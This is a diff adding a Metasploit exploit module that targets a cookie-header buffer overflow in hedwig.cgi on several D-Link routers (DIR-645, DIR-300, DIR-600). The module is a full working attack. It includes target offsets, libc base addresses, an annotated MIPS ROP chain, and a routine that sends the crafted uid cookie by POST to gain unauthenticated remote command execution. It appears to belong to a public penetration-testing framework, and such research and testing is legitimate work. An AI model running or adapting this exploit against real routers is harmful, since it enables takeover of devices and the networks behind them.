@@ -1,0 +1,130 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStagerEcho
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'D-Link hedwig.cgi Buffer Overflow in Cookie Header',
+      'Description'    => %q{
+        This module exploits an anonymous remote code execution vulnerability on several D-Link
+        routers. The vulnerability exists in the handling of HTTP queries to the hedwig.cgi with
+        long value cookies. This module has been tested successfully on D-Link DIR300v2.14, DIR600
+        and the DIR645A1_FW103B11 firmware.
+      },
+      'Author'         =>
+        [
+          'Roberto Paleari', # Vulnerability discovery
+          'Craig Heffner',   # also discovered the vulnerability / help with some parts of this exploit
+          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module and verification on several other routers
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['OSVDB', '95950'],
+          ['EDB', '27283'],
+          ['URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008'], #advisory on vendor web site
+          ['URL', 'http://www.dlink.com/us/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000'], #vendor web site of router
+          ['URL', 'http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt']  #original advisory
+        ],
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_MIPSLE,
+      'Targets'        =>
+        [
+          [ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
+            {
+              'Offset'      => 973,
+              'LibcBase'    => 0x2aaf8000,    # Router
+              #'LibcBase'   => 0x40854000,    # QEMU environment
+              'System'      => 0x000531FF,    # address of system
+              'CalcSystem'  => 0x000158C8,    # calculate the correct address of system
+              'CallSystem'  => 0x000159CC,    # call our system
+            }
+          ]
+        ],
+      'DisclosureDate' => 'Feb 08 2013',
+      'DefaultTarget' => 0))
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'uri'     => "/hedwig.cgi",
+        'method'  => 'GET'
+      })
+
+      if res && [200, 301, 302].include?(res.code) && res.body.to_s =~ /unsupported HTTP request/
+        return Exploit::CheckCode::Detected
+      end
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    print_status("#{peer} - Accessing the vulnerable URL...")
+
+    unless check == Exploit::CheckCode::Detected
+      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
+    end
+
+    print_status("#{peer} - Exploiting...")
+    execute_cmdstager(
+      :linemax => 200,
+      :concat_operator => " && "
+    )
+  end
+
+  def prepare_shellcode(cmd)
+    shellcode = rand_text_alpha_upper(target['Offset'])                  # padding
+    shellcode << [target['LibcBase'] + target['System']].pack("V")       # s0 - address of system
+    shellcode << rand_text_alpha_upper(16)                               # unused reg $s1 - $s4
+    shellcode << [target['LibcBase'] + target['CallSystem']].pack("V")   # s5 - second gadget (call system)
+
+        # .text:000159CC 10 00 B5 27    addiu   $s5, $sp, 0x170+var_160  # get the address of our command into $s5
+        # .text:000159D0 21 28 60 02    move    $a1, $s3                 # not used
+        # .text:000159D4 21 30 20 02    move    $a2, $s1                 # not used
+        # .text:000159D8 21 C8 00 02    move    $t9, $s0                 # $s0 - system
+        # .text:000159DC 09 F8 20 03    jalr    $t9                      # call system
+        # .text:000159E0 21 20 A0 02    move    $a0, $s5                 # our cmd -> into a0 as parameter for system
+
+    shellcode << rand_text_alpha_upper(12)                               # unused registers $s6 - $fp
+    shellcode << [target['LibcBase'] + target['CalcSystem']].pack("V")   # $ra - gadget nr 1 (prepare the parameter for system)
+
+        # .text:000158C8 21 C8 A0 02    move    $t9, $s5                 # s5 - our second gadget
+        # .text:000158CC 09 F8 20 03    jalr    $t9                      # jump the second gadget
+        # .text:000158D0 01 00 10 26    addiu   $s0, 1                   # s0 our system address - lets calculate the right address
+
+    shellcode << rand_text_alpha_upper(16)                               # filler in front of our command
+    shellcode << cmd
+  end
+
+  def execute_command(cmd, opts)
+    shellcode = prepare_shellcode(cmd)
+
+    begin
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => "/hedwig.cgi",
+        'cookie'   => "uid=#{shellcode}",
+        'encode_params' => false,
+        'vars_post' => {
+          rand_text_alpha(4) => rand_text_alpha(4)
+        }
+      })
+      return res
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+end
